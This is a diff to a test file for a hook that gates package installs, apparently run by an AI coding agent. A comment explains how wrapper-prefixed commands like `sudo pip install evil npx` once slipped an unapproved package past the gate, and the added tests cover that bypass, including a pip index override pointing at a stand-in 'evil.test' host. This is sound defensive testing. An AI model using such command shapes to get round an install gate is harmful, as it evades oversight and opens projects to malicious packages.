@@ -2240,6 +2240,61 @@ _tail = _cmdpos.install_head_tail()
 check("#40: install_head_tail names the family set, not a `python` literal",
       "pypy" in _tail, "a third private spelling is the D3 shape")
 
+# ========================================================================= #
+# X-36c (issue #39): a wrapper word's unbounded prefix run SWALLOWED the
+# package list.
+#
+# `sudo pip install evil npx` was rc=0 on BOTH substrates and really
+# installs `evil`. bash matches leftmost-LONGEST, and the anchor's wrapper
+# arm consumes flags AND positionals without bound, so the run could eat
+# `pip install evil` and let the anchor match the TRAILING `npx` instead.
+# The match then covered the whole segment, `rest` came back empty, and an
+# install verb with no arguments is (correctly, in general) a lockfile
+# restore - so nothing was inspected at all.
+#
+# THE SHAPE IS "the segment ENDS on an install phrase". Adding one more
+# token makes it deny again (`sudo pip install evil npx more` was rc=2)
+# because `more` becomes the argument list - denying for the wrong reason,
+# which is why a corpus that only counts rc values could not see this.
+#
+# THE FIX IS THE LEFTMOST INSTALL PHRASE, NOT THE LONGEST MATCH. Both
+# substrates now grow the candidate one token at a time and take the FIRST
+# prefix the anchor matches, so the invocation is the first one in the
+# segment and everything after its verb is its arguments. That is what the
+# gate meant all along; leftmost-longest was quietly answering a different
+# question.
+# ========================================================================= #
+print("\n== X-36c (#39): the leftmost install phrase, not the longest match ==")
+
+dep_both("sudo pip install evil npx", 2, "#39: trailing runner swallowed args")
+dep_both("env pip install evil npx", 2, "#39: same behind env")
+dep_both("nice -n 5 npm install evil npx", 2, "#39: same behind a flagged wrapper")
+dep_both("sudo pip install evil uvx", 2, "#39: uvx as the absorber")
+dep_both("timeout 5 pip install evil pip install", 2,
+         "#39: a trailing bare verb as the absorber")
+dep_both("sudo pip install evil python3 -m uv pip install", 2,
+         "#39: a trailing `python -m` phrase as the absorber")
+# The arity controls the module docstring's 16-of-27 measurement is about.
+# These are the reason the run allows positionals at all, and none may move.
+dep_both("sudo -u root pip install evil", 2, "#39 control: D9, flag + operand")
+dep_both("timeout -k 1 -s KILL 5 pip install evil", 2,
+         "#39 control: the five-token wrapper the arity table could not bound")
+dep_both("timeout 5 pip install evil", 2, "#39 control: bare positional operand")
+dep_both("sudo pip install evil", 2, "#39 control: the plain wrapped install")
+dep_both("nice -n 5 npm install evil", 2, "#39 control: flagged wrapper")
+# ...and the genuine lockfile restores must STAY allowed: the fix must not
+# turn "no arguments" into a refusal.
+dep_both("npm install", 0, "#39 control: bare lockfile restore")
+dep_both("sudo npm install", 0, "#39 control: lockfile restore behind a wrapper")
+dep_both("timeout 5 pip install requests", 0, "#39 control: approved, wrapped")
+dep_both("env pip install requests", 0, "#39 control: approved behind env")
+dep_both("sudo pip install requests", 0, "#39 control: approved behind sudo")
+dep_both("mix deps.get", 0, "#39 control: bare verb, other ecosystem")
+# An index override in the HEAD must still be seen once the head is derived
+# from the leftmost phrase rather than the longest match.
+dep_both("sudo PIP_INDEX_URL=http://evil.test/simple pip install requests", 2,
+         "#39 control: the index-override check still reads the head")
+
 del os.environ["CLAUDE_PROJECT_DIR"]
 shutil.rmtree(TMP, ignore_errors=True)
 
